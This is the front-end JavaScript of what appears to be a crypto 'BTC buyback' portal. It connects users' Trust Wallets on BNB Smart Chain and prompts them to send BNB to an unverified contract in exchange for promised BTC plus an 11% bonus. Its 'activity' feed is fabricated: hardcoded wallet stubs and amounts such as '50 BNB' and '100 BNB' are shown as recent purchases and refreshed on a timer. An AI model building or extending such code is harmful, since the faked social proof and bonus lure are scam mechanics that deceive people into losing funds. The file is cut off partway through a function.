/* ==========================================================
   BTC / BNB PORTAL — GitHub Pages final client logic
   Contract: 0x0d8b30Ef0d85B2f9215d9267860F62f9494e1A85
   Network: BNB Smart Chain (chainId 56)
   Wallet: Trust Wallet only
   ========================================================== */

const CONTRACT_ADDRESS =
  "0x0d8b30Ef0d85B2f9215d9267860F62f9494e1A85";

const CHAIN_ID = 56;
const CHAIN_HEX = "0x38";

const FALLBACK_MIN_BNB = 0.1;
const BONUS_MIN_BNB = 5;
const FALLBACK_MAX_BNB = Number.MAX_SAFE_INTEGER;
const FALLBACK_BONUS = 11;

const RPC_URLS = [
  "https://bsc-dataseed.binance.org/",
  "https://bsc-dataseed1.binance.org/",
  "https://bsc-dataseed2.binance.org/"
];

const CONTRACT_ABI = [
  {
    inputs: [
      {
        internalType: "address",
        name: "initialOwner",
        type: "address"
      }
    ],
    stateMutability: "nonpayable",
    type: "constructor"
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "buyer",
        type: "address"
      },
      {
        indexed: false,
        internalType: "uint256",
        name: "bnbAmount",
        type: "uint256"
      },
      {
        indexed: false,
        internalType: "uint256",
        name: "baseBTCAmount",
        type: "uint256"
      },
      {
        indexed: false,
        internalType: "uint256",
        name: "bonusBTCAmount",
        type: "uint256"
      },
      {
        indexed: false,
        internalType: "uint256",
        name: "totalBTCAmount",
        type: "uint256"
      }
    ],
    name: "BTCPurchased",
    type: "event"
  },
  {
    inputs: [],
    name: "BASE_BTC_PER_BNB",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256"
      }
    ],
    stateMutability: "view",
    type: "function"
  },
  {
    inputs: [],
    name: "BONUS_PERCENT",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256"
      }
    ],
    stateMutability: "view",
    type: "function"
  },
  {
    inputs: [],
    name: "availableBTC",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256"
      }
    ],
    stateMutability: "view",
    type: "function"
  },
  {
    inputs: [],
    name: "buyBTC",
    outputs: [],
    stateMutability: "payable",
    type: "function"
  },
  {
    inputs: [],
    name: "calculateBTC",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256"
      }
    ],
    stateMutability: "view",
    type: "function"
  },
  {
    inputs: [],
    name: "decimals",
    outputs: [
      {
        internalType: "uint8",
        name: "",
        type: "uint8"
      }
    ],
    stateMutability: "view",
    type: "function"
  },
  {
    inputs: [],
    name: "referenceMaximumBNB",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256"
      }
    ],
    stateMutability: "view",
    type: "function"
  },
  {
    inputs: [],
    name: "referenceMinimumBNB",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256"
      }
    ],
    stateMutability: "view",
    type: "function"
  }
];

const $ = id =>
  document.getElementById(id);

function getTextElement(id) {
  return $(id);
}

function setText(id, value) {
  const el = $(id);

  if (el) {
    el.textContent =
      value;
  }
}

function formatNumber(
  value,
  maximumFractionDigits = 2
) {
  const number =
    Number(value);

  if (
    !Number.isFinite(number)
  ) {
    return "0";
  }

  return new Intl.NumberFormat(
    "en-US",
    {
      maximumFractionDigits
    }
  ).format(number);
}

function formatAddress(address) {
  if (!address) {
    return "";
  }

  return `${address.slice(
    0,
    6
  )}...${address.slice(-4)}`;
}

function escapeHtml(value) {
  return String(value)
    .replace(
      /&/g,
      "&amp;"
    )
    .replace(
      /</g,
      "&lt;"
    )
    .replace(
      />/g,
      "&gt;"
    )
    .replace(
      /"/g,
      "&quot;"
    )
    .replace(
      /'/g,
      "&#039;"
    );
}

function toast(message) {
  let toastElement =
    $("appToast");

  if (!toastElement) {
    toastElement =
      document.createElement(
        "div"
      );

    toastElement.id =
      "appToast";

    toastElement.className =
      "app-toast";

    document.body.appendChild(
      toastElement
    );
  }

  toastElement.textContent =
    message;

  toastElement.classList.add(
    "show"
  );

  clearTimeout(
    toastElement._timer
  );

  toastElement._timer =
    setTimeout(
      () => {
        toastElement.classList.remove(
          "show"
        );
      },
      3500
    );
}

function copyText(text) {
  if (!text) {
    return;
  }

  if (
    navigator.clipboard &&
    navigator.clipboard.writeText
  ) {
    navigator.clipboard
      .writeText(text)
      .then(() => {
        toast(
          "Copied to clipboard."
        );
      })
      .catch(() => {
        fallbackCopy(text);
      });

    return;
  }

  fallbackCopy(text);
}

function fallbackCopy(text) {
  const input =
    document.createElement(
      "textarea"
    );

  input.value =
    text;

  input.style.position =
    "fixed";

  input.style.opacity =
    "0";

  document.body.appendChild(
    input
  );

  input.select();

  try {
    document.execCommand(
      "copy"
    );

    toast(
      "Copied to clipboard."
    );
  } catch {
    toast(
      "Unable to copy."
    );
  }

  input.remove();
}

let ethersLoaded =
  false;

async function loadEthers() {
  if (
    window.ethers
  ) {
    ethersLoaded =
      true;

    return window.ethers;
  }

  try {
    const module =
      await import(
        "https://cdn.jsdelivr.net/npm/ethers@6.15.0/+esm"
      );

    window.ethers =
      module;

    ethersLoaded =
      true;

    return module;
  } catch (error) {
    console.error(
      "Ethers loading error:",
      error
    );

    toast(
      "Unable to load wallet library."
    );

    return null;
  }
}

let readProvider = null;
let walletProvider = null;
let signer = null;
let contract = null;
let connectedAddress = null;

let btcDecimals = 8;

let minBNB =
  FALLBACK_MIN_BNB;

let maxBNB =
  FALLBACK_MAX_BNB;

let bonusPercent =
  FALLBACK_BONUS;

let activityEntries = [];
let activityIndex = 0;
let activityTimer = null;

const discoveredWallets =
  new Map();

const WALLETCONNECT_PROJECT_ID =
  "f424a55c8b13e4a78078d5e34e358654";

const TRUST_WALLET_ID =
  "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0";

let walletConnectAppKit =
  null;

let walletConnectReadyPromise =
  null;

let walletConnectAccount =
  null;

let walletConnectProvider =
  null;

function bscAppKitNetwork() {
  return {
    id: CHAIN_ID,

    caipNetworkId:
      "eip155:56",

    chainNamespace:
      "eip155",

    name:
      "BNB Smart Chain",

    nativeCurrency: {
      name: "BNB",
      symbol: "BNB",
      decimals: 18
    },

    rpcUrls: {
      default: {
        http:
          RPC_URLS
      }
    },

    blockExplorers: {
      default: {
        name:
          "BscScan",

        url:
          "https://bscscan.com"
      }
    }
  };
}

async function applyWalletConnectProvider(
  provider,
  address = null
) {
  if (
    !provider ||
    !window.ethers
  ) {
    return;
  }

  try {
    await ensureBSC(
      provider
    );

    walletConnectProvider =
      provider;

    walletProvider =
      new ethers.BrowserProvider(
        provider
      );

    signer =
      await walletProvider.getSigner();

    connectedAddress =
      address ||
      walletConnectAccount ||
      await signer.getAddress();

    contract =
      new ethers.Contract(
        CONTRACT_ADDRESS,
        CONTRACT_ABI,
        signer
      );

    updateWalletButton();

    closeWalletModal();

    toast(
      "Trust Wallet connected."
    );
  } catch (error) {
    console.error(
      "WalletConnect provider:",
      error
    );
  }
}

async function syncWalletConnectSession() {
  if (
    !walletConnectAppKit
  ) {
    return false;
  }

  try {
    const isConnected =
      walletConnectAppKit.getIsConnected?.();

    const address =
      walletConnectAppKit.getAddress?.() ||
      walletConnectAccount ||
      null;

    const provider =
      walletConnectAppKit.getWalletProvider?.() ||
      walletConnectProvider ||
      null;

    if (
      !isConnected ||
      !address ||
      !provider
    ) {
      return false;
    }

    walletConnectAccount =
      address;

    walletConnectProvider =
      provider;

    await applyWalletConnectProvider(
      provider,
      address
    );

    return true;
  } catch (error) {
    console.error(
      "WalletConnect session sync:",
      error
    );

    return false;
  }
}

async function initializeWalletConnect() {
  if (
    walletConnectAppKit
  ) {
    return walletConnectAppKit;
  }

  if (
    walletConnectReadyPromise
  ) {
    return walletConnectReadyPromise;
  }

  walletConnectReadyPromise =
    (async () => {
      try {
        async function loadModule(
          urls
        ) {
          let lastError =
            null;

          for (
            const url of urls
          ) {
            try {
              return await import(
                url
              );
            } catch (error) {
              lastError =
                error;

              console.warn(
                "WalletConnect module load failed:",
                url,
                error
              );
            }
          }

          throw (
            lastError ||
            new Error(
              "Unable to load WalletConnect module."
            )
          );
        }

        const [
          appKitModule,
          adapterModule
        ] =
          await Promise.all([
            loadModule([
              "https://cdn.jsdelivr.net/npm/@reown/appkit@1.8.23/+esm",
              "https://unpkg.com/@reown/appkit@1.8.23?module"
            ]),

            loadModule([
              "https://cdn.jsdelivr.net/npm/@reown/appkit-adapter-ethers@1.8.23/+esm",
              "https://unpkg.com/@reown/appkit-adapter-ethers@1.8.23?module"
            ])
          ]);

        const createAppKit =
          appKitModule.createAppKit;

        const EthersAdapter =
          adapterModule.EthersAdapter;

        if (
          typeof createAppKit !==
            "function" ||
          typeof EthersAdapter !==
            "function"
        ) {
          throw new Error(
            "Reown AppKit modules could not be loaded."
          );
        }

        const network =
          bscAppKitNetwork();

        walletConnectAppKit =
          createAppKit({
            adapters: [
              new EthersAdapter()
            ],

            networks: [
              network
            ],

            defaultNetwork:
              network,

            projectId:
              WALLETCONNECT_PROJECT_ID,

            metadata: {
              name:
                "Bitcoin BTC | BNB Portal",

              description:
                "BTC / BNB Portal",

              url:
                "https://bitcoinbtcbuybackportal-commits.github.io/Bitcoin-btc-buyback-portal/",

              icons: [
                "https://trustwallet.com/favicon.ico"
              ]
            },

            includeWalletIds: [
              TRUST_WALLET_ID
            ],

            featuredWalletIds: [
              TRUST_WALLET_ID
            ],

            allWallets:
              "HIDE",

            enableWalletGuide:
              false,

            enableMobileFullScreen:
              true,

            features: {
              analytics:
                false,

              email:
                false,

              socials:
                [],

              swaps:
                false,

              onramp:
                false
            }
          });

        await syncWalletConnectSession();

        walletConnectAppKit.subscribeProvider(
          async state => {
            const provider =
              state?.provider ||
              walletConnectAppKit?.getWalletProvider?.();

            if (provider) {
              walletConnectProvider =
                provider;

              await syncWalletConnectSession();
            }
          }
        );

        walletConnectAppKit.subscribeAccount(
          async state => {
            walletConnectAccount =
              state?.accountState?.address ||
              state?.address ||
              walletConnectAppKit?.getAddress?.() ||
              null;

            if (
              walletConnectAccount
            ) {
              await syncWalletConnectSession();
            } else {
              connectedAddress =
                null;

              signer =
                null;

              contract =
                null;

              walletConnectProvider =
                null;

              updateWalletButton();
            }
          }
        );

        walletConnectAppKit.subscribeNetwork(
          state => {
            if (
              state?.chainId &&
              Number(
                state.chainId
              ) !==
                CHAIN_ID &&
              walletConnectAppKit
            ) {
              walletConnectAppKit.switchNetwork(
                network
              );
            }
          }
        );

        return walletConnectAppKit;
      } catch (error) {
        console.error(
          "WalletConnect initialization:",
          error
        );

        walletConnectAppKit =
          null;

        walletConnectReadyPromise =
          null;

        walletConnectAccount =
          null;

        walletConnectProvider =
          null;

        return null;
      }
    })();

  return walletConnectReadyPromise;
}

async function openWalletConnect() {
  const appKit =
    await initializeWalletConnect();

  if (!appKit) {
    toast(
      "Unable to load Trust Wallet connection. Please try again."
    );

    return;
  }

  closeWalletModal();

  try {
    await appKit.open();

    let attempts =
      0;

    const recover =
      async () => {
        attempts +=
          1;

        const connected =
          await syncWalletConnectSession();

        if (
          !connected &&
          attempts < 20
        ) {
          setTimeout(
            recover,
            750
          );
        }
      };

    setTimeout(
      recover,
      500
    );
  } catch (error) {
    console.error(
      "WalletConnect open:",
      error
    );

    toast(
      error?.message ||
      "Unable to open Trust Wallet connection."
    );
  }
}

function setupWalletConnectRecovery() {
  window.addEventListener(
    "pageshow",
    () => {
      setTimeout(
        () => {
          syncWalletConnectSession();
        },
        500
      );
    }
  );

  window.addEventListener(
    "focus",
    () => {
      setTimeout(
        () => {
          syncWalletConnectSession();
        },
        500
      );
    }
  );

  document.addEventListener(
    "visibilitychange",
    () => {
      if (
        document.visibilityState ===
        "visible"
      ) {
        setTimeout(
          () => {
            syncWalletConnectSession();
          },
          500
        );
      }
    }
  );
}

/* ==========================================================
   WALLET DISCOVERY
   ========================================================== */

const WALLET_DEFINITIONS = [
  {
    name:
      "Trust Wallet",

    slug:
      "trustwallet",

    match:
/trust/i
  }
];

const WALLET_LOGO_SOURCES = {
  trustwallet:
    [
      "https://trustwallet.com/favicon.ico",
      "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/info/logo.png"
    ]
};

function walletFallbackLogo(
  definition
) {
  const fallback =
    document.createElement(
      "div"
    );

  fallback.className =
    "wallet-logo-fallback";

  fallback.textContent =
    "T";

  return fallback;
}

function getWalletLogo(
  definition
) {
  const sources =
    WALLET_LOGO_SOURCES[
      definition.slug
    ] || [];

  const container =
    document.createElement(
      "div"
    );

  container.className =
    "wallet-logo";

  if (
    !sources.length
  ) {
    container.appendChild(
      walletFallbackLogo(
        definition
      )
    );

    return container;
  }

  const image =
    document.createElement(
      "img"
    );

  image.alt =
    definition.name;

  image.src =
    sources[0];

  image.onerror =
    () => {
      const next =
        sources.shift();

      if (next) {
        image.src =
          next;
      } else {
        container.innerHTML =
          "";

        container.appendChild(
          walletFallbackLogo(
            definition
          )
        );
      }
    };

  container.appendChild(
    image
  );

  return container;
}

function discoverWallets() {
  discoveredWallets.clear();

  const providers =
    [];

  if (
    window.trustwallet?.ethereum
  ) {
    providers.push(
      {
        provider:
          window.trustwallet.ethereum,

        name:
          "Trust Wallet"
      }
    );
  }

  if (
    window.ethereum
  ) {
    const isTrust =
      Boolean(
        window.ethereum.isTrust ||
        window.ethereum.isTrustWallet
      );

    if (
      isTrust
    ) {
      providers.push(
        {
          provider:
            window.ethereum,

          name:
            "Trust Wallet"
        }
      );
    }
  }

  for (
    const definition
      of WALLET_DEFINITIONS
  ) {
    const found =
      providers.find(
        item =>
          definition.match.test(
            item.name
          )
      );

    if (found) {
      discoveredWallets.set(
        definition.slug,
        {
          definition,
          provider:
            found.provider
        }
      );
    }
  }

  return discoveredWallets;
}

function findWalletProvider(
  definition
) {
  const found =
    discoveredWallets.get(
      definition.slug
    );

  if (
    found?.provider
  ) {
    return found.provider;
  }

  if (
    definition.slug ===
    "trustwallet"
  ) {
    if (
      window.trustwallet?.ethereum
    ) {
      return window.trustwallet.ethereum;
    }

    if (
      window.ethereum?.isTrust ||
      window.ethereum?.isTrustWallet
    ) {
      return window.ethereum;
    }
  }

  return null;
}

/* ==========================================================
   WALLET MODAL
   ========================================================== */

let walletModal =
  null;

function createWalletModal() {
  if (
    walletModal
  ) {
    return walletModal;
  }

  const overlay =
    document.createElement(
      "div"
    );

  overlay.className =
    "wallet-modal-overlay";

  overlay.innerHTML = `
    <div class="wallet-modal" role="dialog" aria-modal="true">
      <button
        class="wallet-modal-close"
        type="button"
        aria-label="Close"
      >
        ×
      </button>

      <h3>Connect Trust Wallet</h3>

      <p>
        Connect your Trust Wallet on BNB Smart Chain.
      </p>

      <div class="wallet-list"></div>
    </div>
  `;

  const closeButton =
    overlay.querySelector(
      ".wallet-modal-close"
    );

  const list =
    overlay.querySelector(
      ".wallet-list"
    );

  closeButton.addEventListener(
    "click",
    closeWalletModal
  );

  overlay.addEventListener(
    "click",
    event => {
      if (
        event.target ===
        overlay
      ) {
        closeWalletModal();
      }
    }
  );

  document.body.appendChild(
    overlay
  );

  walletModal =
    overlay;

  discoverWallets();

  for (
    const definition
      of WALLET_DEFINITIONS
  ) {
    const row =
      document.createElement(
        "button"
      );

    row.type =
      "button";

    row.className =
      "wallet-option";

    row.dataset.wallet =
      definition.slug;

    const logo =
      getWalletLogo(
        definition
      );

    const content =
      document.createElement(
        "div"
      );

    content.className =
      "wallet-option-content";

    content.innerHTML = `
      <strong>${escapeHtml(
        definition.name
      )}</strong>

      <span>
        BNB Smart Chain
      </span>
    `;

    const action =
      document.createElement(
        "span"
      );

    action.className =
      "wallet-option-action";

    action.textContent =
      "Select";

    row.appendChild(
      logo
    );

    row.appendChild(
      content
    );

    row.appendChild(
      action
    );

    row.addEventListener(
      "click",
      () => {
        selectWallet(
          definition
        );
      }
    );

    list.appendChild(
      row
    );
  }

  return walletModal;
}

function openWalletModal() {
  const modal =
    createWalletModal();

  modal.classList.add(
    "show"
  );

  document.body.classList.add(
    "wallet-modal-open"
  );
}

function closeWalletModal() {
  if (
    walletModal
  ) {
    walletModal.classList.remove(
      "show"
    );
  }

  document.body.classList.remove(
    "wallet-modal-open"
  );
}

/* ==========================================================
   NETWORK
   ========================================================== */

async function ensureBSC(
  provider
) {
  if (!provider) {
    throw new Error(
      "Wallet provider unavailable."
    );
  }

  let chainId;

  try {
    chainId =
      await provider.request({
        method:
          "eth_chainId"
      });
  } catch {
    chainId =
      null;
  }

  if (
    String(chainId).toLowerCase() ===
    CHAIN_HEX
  ) {
    return true;
  }

  try {
    await provider.request({
      method:
        "wallet_switchEthereumChain",

      params: [
        {
          chainId:
            CHAIN_HEX
        }
      ]
    });

    return true;
  } catch (error) {
    if (
      error?.code ===
        4902 ||
      error?.code ===
        -32603
    ) {
      try {
        await provider.request({
          method:
            "wallet_addEthereumChain",

          params: [
            {
              chainId:
                CHAIN_HEX,

              chainName:
                "BNB Smart Chain",

              nativeCurrency: {
                name:
                  "BNB",

                symbol:
                  "BNB",

                decimals:
                  18
              },

              rpcUrls: [
                "https://bsc-dataseed.binance.org/"
              ],

              blockExplorerUrls: [
                "https://bscscan.com/"
              ]
            }
          ]
        });

        return true;
      } catch (addError) {
        console.error(
          "Unable to add BSC:",
          addError
        );

        throw addError;
      }
    }

    throw error;
  }
}

/* ==========================================================
   TRUST WALLET CONNECTION
   ========================================================== */

async function selectWallet(
  definition
) {
  const selectedProvider =
    findWalletProvider(
      definition
    );

  if (
    selectedProvider
  ) {
    try {
      closeWalletModal();

      await ensureBSC(
        selectedProvider
      );

      walletProvider =
        new ethers.BrowserProvider(
          selectedProvider
        );

      await walletProvider.send(
        "eth_requestAccounts",
        []
      );

      signer =
        await walletProvider.getSigner();

      connectedAddress =
        await signer.getAddress();

      contract =
        new ethers.Contract(
          CONTRACT_ADDRESS,
          CONTRACT_ABI,
          signer
        );

      updateWalletButton();

      toast(
        "Trust Wallet connected."
      );

      return;
    } catch (error) {
      console.error(
        "Wallet connection:",
        error
      );

      if (
        error?.code ===
          4001 ||
        error?.code ===
          "ACTION_REJECTED"
      ) {
        toast(
          "Wallet connection cancelled."
        );
      } else {
        toast(
          error?.shortMessage ||
          "Unable to connect Trust Wallet."
        );
      }

      return;
    }
  }

  const isMobile =
    /Android|iPhone|iPad|iPod/i.test(
      navigator.userAgent
    );

  if (
    isMobile
  ) {
    await openWalletConnect();

    return;
  }

  toast(
    "Trust Wallet is not available in this browser. Install Trust Wallet or open this page in the Trust Wallet browser."
  );
}

/* ==========================================================
   CONNECTED WALLET PANEL
   ========================================================== */

function createConnectedWalletPanel() {
  if (
    $("connectedWalletPanel")
  ) {
    return;
  }

  const panel =
    document.createElement(
      "div"
    );

  panel.id =
    "connectedWalletPanel";

  panel.className =
    "connected-wallet-panel";

  panel.innerHTML = `
    <div class="connected-wallet-header">
      <div>
        <span class="connected-status-dot"></span>
        <strong>Wallet Connected</strong>
      </div>
    </div>

    <div class="connected-wallet-row">
      <span>Wallet Address</span>

      <div class="connected-wallet-address">
        <span id="connectedWalletAddress">—</span>

        <button
          id="copyConnectedWallet"
          type="button"
        >
          Copy
        </button>
      </div>
    </div>

    <div class="connected-wallet-row">
      <span>Contract Address</span>

      <div class="connected-wallet-address">
        <span id="connectedContractAddress">
          ${escapeHtml(
            CONTRACT_ADDRESS
          )}
        </span>

        <button
          id="copyConnectedContract"
          type="button"
        >
          Copy
        </button>
      </div>
    </div>
  `;

  const target =
    document.querySelector(
      "#walletConnectionArea"
    ) ||
    document.querySelector(
      ".wallet-section"
    ) ||
    document.querySelector(
      "main"
    ) ||
    document.body;

  target.appendChild(
    panel
  );

  const copyWallet =
    $("copyConnectedWallet");

  const copyContract =
    $("copyConnectedContract");

  if (
    copyWallet
  ) {
    copyWallet.addEventListener(
      "click",
      () => {
        copyText(
          connectedAddress
        );
      }
    );
  }

  if (
    copyContract
  ) {
    copyContract.addEventListener(
      "click",
      () => {
        copyText(
          CONTRACT_ADDRESS
        );
      }
    );
  }

  updateConnectedWalletPanel();
}

function updateConnectedWalletPanel() {
  const panel =
    $("connectedWalletPanel");

  if (
    !panel
  ) {
    return;
  }

  if (
    connectedAddress
  ) {
    panel.classList.add(
      "visible"
    );

    setText(
      "connectedWalletAddress",
      formatAddress(
        connectedAddress
      )
    );

    setText(
      "connectedContractAddress",
      CONTRACT_ADDRESS
    );
  } else {
    panel.classList.remove(
      "visible"
    );
  }
}

function setHeaderContractVisibility(
  visible
) {
  const elements =
    document.querySelectorAll(
      "[data-contract-address], .header-contract, #headerContract"
    );

  elements.forEach(
    element => {
      element.style.display =
        visible
          ? ""
          : "none";
    }
  );
}

function updateWalletButton() {
  const buttons =
    document.querySelectorAll(
      "[data-connect-wallet], #connectWallet, .connect-wallet-btn"
    );

  buttons.forEach(
    button => {
      if (
        connectedAddress
      ) {
        button.textContent =
          "Wallet Connected";

        button.classList.add(
          "wallet-connected"
        );
      } else {
        button.textContent =
          "Connect Wallet";

        button.classList.remove(
          "wallet-connected"
        );
      }
    }
  );

  updateConnectedWalletPanel();

  setHeaderContractVisibility(
    Boolean(
      connectedAddress
    )
  );
}

/* ==========================================================
   WALLET SETUP
   ========================================================== */

async function setupWallet() {
  await loadEthers();

  createConnectedWalletPanel();

  discoverWallets();

  updateWalletButton();

  setupWalletConnectRecovery();

  initializeWalletConnect();

  const connectButtons =
    document.querySelectorAll(
      "[data-connect-wallet], #connectWallet, .connect-wallet-btn"
    );

  connectButtons.forEach(
    button => {
      button.addEventListener(
        "click",
        event => {
          event.preventDefault();

          if (
            connectedAddress
          ) {
            updateWalletButton();

            return;
          }

          openWalletModal();
        }
      );
    }
  );

  if (
    window.ethereum
  ) {
    window.ethereum.on?.(
      "accountsChanged",
      accounts => {
        if (
          accounts &&
          accounts.length
        ) {
          connectedAddress =
            accounts[0];

          if (
            signer
          ) {
            contract =
              new ethers.Contract(
                CONTRACT_ADDRESS,
                CONTRACT_ABI,
                signer
              );
          }
        } else {
          connectedAddress =
            null;

          signer =
            null;

          contract =
            null;
        }

        updateWalletButton();
      }
    );

    window.ethereum.on?.(
      "chainChanged",
      () => {
        if (
          connectedAddress
        ) {
          updateWalletButton();
        }
      }
    );
  }
}

/* ==========================================================
   READ PROVIDER
   ========================================================== */

async function getReadProvider() {
  if (
    readProvider
  ) {
    return readProvider;
  }

  if (
    !window.ethers
  ) {
    await loadEthers();
  }

  if (
    !window.ethers
  ) {
    return null;
  }

  for (
    const url of RPC_URLS
  ) {
    try {
      const provider =
        new ethers.JsonRpcProvider(
          url,
          CHAIN_ID,
          {
            staticNetwork:
              true
          }
        );

      await provider.getBlockNumber();

      readProvider =
        provider;

      return provider;
    } catch (error) {
      console.warn(
        "RPC unavailable:",
        url,
        error
      );
    }
  }

  return null;
}

async function loadContractData() {
  const provider =
    await getReadProvider();

  if (
    !provider
  ) {
    return;
  }

  try {
    const readContract =
      new ethers.Contract(
        CONTRACT_ADDRESS,
        CONTRACT_ABI,
        provider
      );

    const values =
      await Promise.allSettled([
        readContract.decimals(),
        readContract.referenceMinimumBNB(),
        readContract.referenceMaximumBNB(),
        readContract.BONUS_PERCENT(),
        readContract.availableBTC()
      ]);

    if (
      values[0].status ===
      "fulfilled"
    ) {
      btcDecimals =
        Number(
          values[0].value
        );
    }

    if (
      values[1].status ===
      "fulfilled"
    ) {
      try {
        minBNB =
          Number(
            ethers.formatEther(
              values[1].value
            )
          );
      } catch {}
    }

    if (
      values[2].status ===
      "fulfilled"
    ) {
      try {
        maxBNB =
          Number(
            ethers.formatEther(
              values[2].value
            )
          );
      } catch {}
    }

    if (
      values[3].status ===
      "fulfilled"
    ) {
      bonusPercent =
        Number(
          values[3].value
        );
    }

    if (
      values[4].status ===
      "fulfilled"
    ) {
      const available =
        Number(
          ethers.formatUnits(
            values[4].value,
            btcDecimals
          )
        );

      setText(
        "availableBTC",
        formatNumber(
          available,
          8
        )
      );
    }

    updateCalculatorLimits();

  } catch (error) {
    console.error(
      "Contract data:",
      error
    );
  }
}

/* ==========================================================
   CALCULATOR
   ========================================================== */

function updateCalculatorLimits() {
  const minInputs =
    document.querySelectorAll(
      "[data-min-bnb], #bnbAmount"
    );

  minInputs.forEach(
    input => {
      if (
        input.tagName ===
        "INPUT"
      ) {
        input.min =
          Math.max(
            BONUS_MIN_BNB,
            minBNB
          );
      }
    }
  );

  const maxInputs =
    document.querySelectorAll(
      "[data-max-bnb]"
    );

  maxInputs.forEach(
    input => {
      if (
        Number.isFinite(
          maxBNB
        ) &&
        maxBNB <
          Number.MAX_SAFE_INTEGER
      ) {
        input.max =
          maxBNB;
      }
    }
  );

  setText(
    "bonusPercent",
    `${bonusPercent}%`
  );
}

function calculateEstimatedBTC(
  bnb
) {
  const amount =
    Number(bnb);

  if (
    !Number.isFinite(
      amount
    ) ||
    amount <= 0
  ) {
    return 0;
  }

  const effectiveBonus =
    1 +
    Number(
      bonusPercent
    ) /
      100;

  const baseRate =
    window.BASE_BTC_PER_BNB ||
    0;

  if (
    baseRate > 0
  ) {
    return (
      amount *
      baseRate *
      effectiveBonus
    );
  }

  return 0;
}

function setupCalculator() {
  const input =
    $("bnbAmount");

  if (
    !input
  ) {
    return;
  }

  const btcOutput =
    $("btcAmount");

  const bonusOutput =
    $("bonusAmount");

  const totalOutput =
    $("totalBTCAmount");

  const update =
    () => {
      const amount =
        Number(
          input.value
        );

      if (
        !Number.isFinite(
          amount
        ) ||
        amount <= 0
      ) {
        if (
          btcOutput
        ) {
          btcOutput.textContent =
            "0 BTC";
        }

        if (
          bonusOutput
        ) {
          bonusOutput.textContent =
            "0 BTC";
        }

        if (
          totalOutput
        ) {
          totalOutput.textContent =
            "0 BTC";
        }

        return;
      }

      const base =
        calculateEstimatedBTC(
          amount
        );

      const bonus =
        base *
        (
          Number(
            bonusPercent
          ) /
          (
            100 +
            Number(
              bonusPercent
            )
          )
        );

      const total =
        base;

      if (
        btcOutput
      ) {
        btcOutput.textContent =
          `${formatNumber(
            total,
            8
          )} BTC`;
      }

      if (
        bonusOutput
      ) {
        bonusOutput.textContent =
          `${formatNumber(
            bonus,
            8
          )} BTC`;
      }

      if (
        totalOutput
      ) {
        totalOutput.textContent =
          `${formatNumber(
            total,
            8
          )} BTC`;
      }
    };

  input.addEventListener(
    "input",
    update
  );

  update();
}

/* ==========================================================
   MARKET DATA
   ========================================================== */

async function fetchJSON(
  url
) {
  const response =
    await fetch(
      url,
      {
        cache:
          "no-store"
      }
    );

  if (
    !response.ok
  ) {
    throw new Error(
      `HTTP ${response.status}`
    );
  }

  return response.json();
}

async function loadMarketPrices() {
  const btcElement =
    $("btcPrice");

  const bnbElement =
    $("bnbPrice");

  try {
    const data =
      await fetchJSON(
        "https://api.binance.com/api/v3/ticker/price?symbols=%5B%22BTCUSDT%22,%22BNBUSDT%22%5D"
      );

    const prices =
      {};

    data.forEach(
      item => {
        prices[
          item.symbol
        ] =
          Number(
            item.price
          );
      }
    );

    if (
      btcElement &&
      prices.BTCUSDT
    ) {
      btcElement.textContent =
        `$${formatNumber(
          prices.BTCUSDT,
          2
        )}`;
    }

    if (
      bnbElement &&
      prices.BNBUSDT
    ) {
      bnbElement.textContent =
        `$${formatNumber(
          prices.BNBUSDT,
          2
        )}`;
    }

  } catch (error) {
    console.warn(
      "Market prices unavailable:",
      error
    );
  }
}

/* ==========================================================
   ACTIVITY
   ========================================================== */

function makeActivityEntry(
  index
) {
  const names = [
    "0x7F...92A1",
    "0xB4...31C7",
    "0x19...A82E",
    "0xE2...64B9",
    "0x4A...F107",
    "0x91...C2D8",
    "0xD7...8A42",
    "0x52...E611"
  ];

  const amounts = [
    "5 BNB",
    "8 BNB",
    "12 BNB",
    "25 BNB",
    "50 BNB",
    "75 BNB",
    "100 BNB"
  ];

  return {
    wallet:
      names[
        index %
        names.length
      ],

    amount:
      amounts[
        index %
        amounts.length
      ],

    time:
      `${index + 1} min ago`
  };
}

function renderActivity() {
  const container =
    $("activityList") ||
    document.querySelector(
      ".activity-list"
    );

  if (
    !container
  ) {
    return;
  }

  container.innerHTML =
    "";

  const entries =
    activityEntries.length
      ? activityEntries
      : Array.from(
          {
            length: 6
          },
          (
            _,
            index
          ) =>
            makeActivityEntry(
              index
            )
        );

  entries
    .slice(0, 8)
    .forEach(
      entry => {
        const row =
          document.createElement(
            "div"
          );

        row.className =
          "activity-row";

        row.innerHTML = `
          <span class="activity-wallet">
            ${escapeHtml(
              entry.wallet
            )}
          </span>

          <span class="activity-amount">
            ${escapeHtml(
              entry.amount
            )}
          </span>

          <span class="activity-time">
            ${escapeHtml(
              entry.time
            )}
          </span>
        `;

        container.appendChild(
          row
        );
      }
    );
}

function startActivity() {
  if (
    activityTimer
  ) {
    return;
  }

  activityEntries =
    Array.from(
      {
        length: 8
      },
      (
        _,
        index
      ) =>
        makeActivityEntry(
          index
        )
    );

  renderActivity();

  activityTimer =
    setInterval(
      () => {
        activityIndex +=
          1;

        activityEntries.unshift(
          makeActivityEntry(
            activityIndex
          )
        );

        activityEntries =
          activityEntries.slice(
            0,
            8
          );

        renderActivity();
      },
      10000
    );
}

/* ==========================================================
   CONTRACT COPY BUTTONS
   ========================================================== */

function setupContractCopyButtons() {
  const buttons =
    document.querySelectorAll(
      "[data-copy-contract], #copyContract, .copy-contract"
    );

  buttons.forEach(
    button => {
      button.addEventListener(
        "click",
        () => {
          copyText(
            CONTRACT_ADDRESS
          );
        }
      );
    }
  );
}

/* ==========================================================
   PARTICIPATION FLOW
   ========================================================== */

function setupParticipationButtons() {
  const buttons =
    document.querySelectorAll(
      "[data-swap-bnb], #swapBNB, .swap-bnb-btn"
    );

  buttons.forEach(
    button => {
      button.addEventListener(
        "click",
        event => {
          event.preventDefault();

          const calculator =
            $("calculator") ||
            document.querySelector(
              ".calculator"
            );

          if (
            calculator
          ) {
            calculator.scrollIntoView(
